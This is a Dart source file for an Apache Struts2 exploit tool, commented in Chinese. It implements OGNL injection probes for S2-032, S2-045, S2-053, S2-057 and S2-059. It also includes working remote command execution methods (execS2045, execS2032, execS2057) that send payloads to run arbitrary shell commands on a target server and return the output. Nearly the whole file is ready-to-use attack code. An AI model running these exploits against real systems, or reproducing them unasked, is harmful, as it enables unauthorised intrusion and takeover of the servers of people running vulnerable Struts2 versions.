import 'package:http/http.dart' as http;

enum Struts2VulnType {
  s2032('S2-032 (CVE-2016-3081)', 'DMI 方法 OGNL 注入'),
  s2045('S2-045 (CVE-2017-5638)', 'Content-Type OGNL 注入'),
  s2053('S2-053', 'Freemarker 模板 OGNL 注入'),
  s2057('S2-057 (CVE-2018-11776)', 'Namespace OGNL 注入'),
  s2059('S2-059 (CVE-2019-0230)', '标签属性二次 OGNL 求值');

  const Struts2VulnType(this.label, this.desc);
  final String label;
  final String desc;
}

class Struts2Result {
  final bool vulnerable;
  final String vulnName;
  final String detail;
  Struts2Result(this.vulnerable, this.vulnName, this.detail);
}

class Struts2ExpService {
  final Uri baseUri;
  final Duration timeout;

  Struts2ExpService({required String url, this.timeout = const Duration(seconds: 10)})
      : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');

  // S2-045: Content-Type header OGNL
  // 服务器写完 marker 后会直接关闭连接（chunked transfer 未正常结束），
  // http.post() 会因此抛异常。改用 StreamedResponse 逐块读取，
  // 连接中断后仍检查已收到的内容。
  Future<Struts2Result> checkS2045() async {
    const marker = '54289';
    final ognl = '%{(#nike=\'multipart/form-data\').'
        '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
        '(#_memberAccess?(#_memberAccess=#dm):'
        '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
        '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
        '(#ognlUtil.getExcludedPackageNames().clear()).'
        '(#ognlUtil.getExcludedClasses().clear()).'
        '(#context.setMemberAccess(#dm)))).'
        '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
        '(#ros.write(new java.lang.String("$marker").getBytes())).'
        '(#ros.flush())}.multipart/form-data';
    final client = http.Client();
    try {
      final request = http.Request('POST', baseUri);
      request.headers['Content-Type'] = ognl;
      final streamed = await client.send(request).timeout(timeout);
      final buf = StringBuffer();
      try {
        await for (final chunk in streamed.stream.timeout(timeout)) {
          buf.write(String.fromCharCodes(chunk));
          if (buf.toString().contains(marker)) break;
        }
      } catch (_) {
        // 服务器提前关闭连接属正常现象，检查已收到的内容
      }
      if (buf.toString().contains(marker)) {
        return Struts2Result(true, 'S2-045 (CVE-2017-5638)', 'Content-Type OGNL 注入，响应体含标记值 $marker');
      }
    } catch (_) {} finally {
      client.close();
    }
    return Struts2Result(false, 'S2-045 (CVE-2017-5638)', '');
  }

  // S2-032: method: 参数 OGNL
  Future<Struts2Result> checkS2032() async {
    try {
      final detectUrl = '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d"54289",%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
      final res = await http.get(Uri.parse(detectUrl)).timeout(timeout);
      if (res.body.contains('54289')) {
        return Struts2Result(true, 'S2-032 (CVE-2016-3081)', 'DMI 方法 OGNL 注入，验证通过');
      }
    } catch (_) {}
    return Struts2Result(false, 'S2-032 (CVE-2016-3081)', '');
  }

  // S2-053: Freemarker name 字段
  Future<Struts2Result> checkS2053() async {
    try {
      final payload = 'name=%25%7b233*233%7d';
      final res = await http.post(baseUri, headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: payload).timeout(timeout);
      if (res.body.contains('54289')) {
        return Struts2Result(true, 'S2-053', 'Freemarker OGNL 注入，数学运算验证通过 (233*233=54289)');
      }
    } catch (_) {}
    return Struts2Result(false, 'S2-053', '');
  }

  // S2-057: namespace OGNL (需要路径)
  // 漏洞触发时 OGNL 表达式求值结果出现在 Location 响应头，而非响应体
  Future<Struts2Result> checkS2057({String path = 'struts2-showcase'}) async {
    try {
      final detectUrl = 'http://${baseUri.host}:${baseUri.port}/$path/%24%7b233*233%7d/actionChain1.action';
      final request = http.Request('GET', Uri.parse(detectUrl));
      request.followRedirects = false;
      final client = http.Client();
      try {
        final streamed = await client.send(request).timeout(timeout);
        final location = streamed.headers['location'] ?? '';
        if (location.contains('54289')) {
          return Struts2Result(true, 'S2-057 (CVE-2018-11776)', 'Namespace OGNL 注入，数学运算验证通过 (Location: $location)');
        }
      } finally {
        client.close();
      }
    } catch (_) {}
    return Struts2Result(false, 'S2-057 (CVE-2018-11776)', '');
  }

  // S2-059: id 字段二次 OGNL 求值
  Future<Struts2Result> checkS2059() async {
    try {
      final payload = 'id=%25%7b233*233%7d';
      final res = await http.post(baseUri, headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: payload).timeout(timeout);
      if (res.body.contains('54289')) {
        return Struts2Result(true, 'S2-059 (CVE-2019-0230)', '标签属性二次 OGNL 求值，数学运算验证通过');
      }
    } catch (_) {}
    return Struts2Result(false, 'S2-059 (CVE-2019-0230)', '');
  }

  Future<Struts2Result> checkSingle(Struts2VulnType type, {String path = 'struts2-showcase'}) async {
    switch (type) {
      case Struts2VulnType.s2032: return checkS2032();
      case Struts2VulnType.s2045: return checkS2045();
      case Struts2VulnType.s2053: return checkS2053();
      case Struts2VulnType.s2057: return checkS2057(path: path);
      case Struts2VulnType.s2059: return checkS2059();
    }
  }

  // 执行命令 - S2-045
  // 用 Scanner+useDelimiter("\\A") 替代 IOUtils.copy，避免 commons-io 依赖。
  // 结果写入 OutputStream 后服务器提前关闭连接，需 StreamedResponse 处理。
  Future<String?> execS2045(String cmd) async {
    final escaped = cmd.replaceAll('\\', '\\\\').replaceAll("'", "\\'");
    final ognl = '%{(#nike=\'multipart/form-data\').'
        '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
        '(#_memberAccess?(#_memberAccess=#dm):'
        '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
        '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
        '(#ognlUtil.getExcludedPackageNames().clear()).'
        '(#ognlUtil.getExcludedClasses().clear()).'
        '(#context.setMemberAccess(#dm)))).'
        '(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).'
        '(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'$escaped\'}:{\'/bin/bash\',\'-c\',\'$escaped\'})).'
        '(#p=new java.lang.ProcessBuilder(#cmds)).'
        '(#p.redirectErrorStream(true)).'
        '(#process=#p.start()).'
        '(#out=new java.util.Scanner(#process.getInputStream()).useDelimiter("\\\\A")).'
        '(#output=(#out.hasNext()?#out.next():"")).'
        '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
        '(#ros.write(#output.getBytes())).'
        '(#ros.flush())}';
    final client = http.Client();
    try {
      final request = http.Request('POST', baseUri);
      request.headers['Content-Type'] = ognl;
      final streamed = await client.send(request).timeout(timeout);
      final buf = StringBuffer();
      try {
        await for (final chunk in streamed.stream.timeout(timeout)) {
          buf.write(String.fromCharCodes(chunk));
        }
      } catch (_) {}
      final body = buf.toString();
      // 若 OGNL 失败，服务器返回正常 HTML 页面；命令输出不含 '<html'
      if (body.isNotEmpty && !body.trimLeft().startsWith('<')) {
        return body;
      }
      return null;
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }

  // 执行命令 - S2-032
  Future<String?> execS2032(String cmd) async {
    try {
      final encodedCmd = Uri.encodeComponent(cmd);
      final url = '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=$encodedCmd';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.trim().isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - S2-057
  // S2-057 的 OGNL 在 namespace 解析阶段执行，之后 Struts2 仍会 sendRedirect。
  // 命令输出作为 OGNL 最终求值结果嵌入重定向 Location header 的路径段中，
  // 不会出现在响应体。因此必须禁用重定向跟随，从 Location header 提取输出。
  Future<String?> execS2057(String cmd, {String path = 'struts2-showcase'}) async {
    try {
      // 单引号转义，使命令嵌入 OGNL 字符串字面量
      final escapedCmd = cmd.replaceAll('\\', '\\\\').replaceAll("'", "\\'");
      // 与 vulhub README PoC 完全一致：exec(string) 形式，避免 OGNL 数组语法问题
      final ognl = "\${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
          ".(#ct=#request['struts.valueStack'].context)"
          ".(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])"
          ".(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
          ".(#ou.getExcludedPackageNames().clear())"
          ".(#ou.getExcludedClasses().clear())"
          ".(#ct.setMemberAccess(#dm))"
          ".(#a=@java.lang.Runtime@getRuntime().exec('$escapedCmd'))"
          ".(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}";
      final encodedOgnl = Uri.encodeComponent(ognl);
      final url = 'http://${baseUri.host}:${baseUri.port}/$path/$encodedOgnl/actionChain1.action';

      final request = http.Request('GET', Uri.parse(url));
      request.followRedirects = false;
      final client = http.Client();
      try {
        final streamed = await client.send(request).timeout(timeout);
        final location = streamed.headers['location'] ?? '';
        if (location.isEmpty) return null;
        // Location 格式：(http://host:port)?/<path>/<cmd_output>/<chained_action>.action
        // chained action 由 struts 配置决定（如 register2.action），不可硬编码。
        // 提取 /<path>/ 之后、最后一个 / 之前的部分即为命令输出。
        String locPath = location;
        if (locPath.startsWith('http')) {
          locPath = Uri.parse(locPath).path;
        }
        final prefix = '/$path/';
        if (locPath.startsWith(prefix)) {
          final rest = locPath.substring(prefix.length); // <cmd_output>/<action>.action
          final lastSlash = rest.lastIndexOf('/');
          final raw = lastSlash > 0 ? rest.substring(0, lastSlash) : rest;
          return Uri.decodeComponent(raw).trim();
        }
        return location; // 兜底：返回完整值供调试
      } finally {
        client.close();
      }
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(Struts2VulnType type, String cmd, {String path = 'struts2-showcase'}) async {
    switch (type) {
      case Struts2VulnType.s2045: return execS2045(cmd);
      case Struts2VulnType.s2032: return execS2032(cmd);
      case Struts2VulnType.s2057: return execS2057(cmd, path: path);
      default: return execS2045(cmd);
    }
  }
}
